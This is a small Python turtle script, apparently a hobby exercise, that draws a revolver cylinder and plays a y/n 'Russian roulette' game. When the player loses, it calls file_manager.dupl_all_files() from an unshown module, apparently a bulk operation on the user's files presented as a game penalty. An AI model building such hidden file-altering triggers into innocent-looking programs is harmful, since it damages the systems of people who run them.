# coding: utf-8

import turtle
import random
import math

import file_manager

PHI = 360 / 7
RADIUS= 50
turtle.speed(0)

def final_text(text, base_x, base_y):
    gotoxy(base_x, base_y)
    turtle.write(text, font=("Arial", 18, "normal"))
    return True

def gotoxy(x, y):
    turtle.penup()
    turtle.goto(x, y)
    turtle.pendown()

def draw_circle(color, diameter):
    turtle.fillcolor(color)
    turtle.begin_fill()
    turtle.circle(diameter)
    turtle.end_fill()

def drow_pistol(base_x, base_y):
    # основной круг
    gotoxy(base_x, base_y)
    turtle.circle(80)
    # мушка
    gotoxy(base_x, base_y + 160)
    draw_circle('red', 5)
    # барабан
    for i in range(0, 7):
        phi_rad = PHI * i * math.pi / 180.0
        gotoxy(base_x + math.sin(phi_rad) * RADIUS, base_y + math.cos(phi_rad) * RADIUS + 60)
        draw_circle('white', 20)

def rotate_pistol(base_x, base_y, start):
    for i in range(start, random.randrange(7, 10)):
        phi_rad = PHI * i * math.pi / 180.0
        gotoxy(base_x + math.sin(phi_rad) * RADIUS, base_y + math.cos(phi_rad) * RADIUS + 60)
        draw_circle('brown', 20)
        draw_circle('white', 20)
    gotoxy(base_x + math.sin(phi_rad) * RADIUS, base_y + math.cos(phi_rad) * RADIUS + 60)
    draw_circle('brown', 20)
    return  i % 7

def main():
    drow_pistol(100, 100)

    end_text = False
    start = 0
    answer = ''
    while answer != 'n':
        answer = turtle.textinput("Russian roulette", "let's play? y/n")
        if answer == 'y':
            start = rotate_pistol(100, 100, start)
            if start == 0:
                end_text = "You lose!"
                file_manager.dupl_all_files()
            else:
                end_text = "Lucky you!"

            final_text(end_text, 55, 300)

if __name__ == "__main__":
    main()
    print('=this is my program!=')
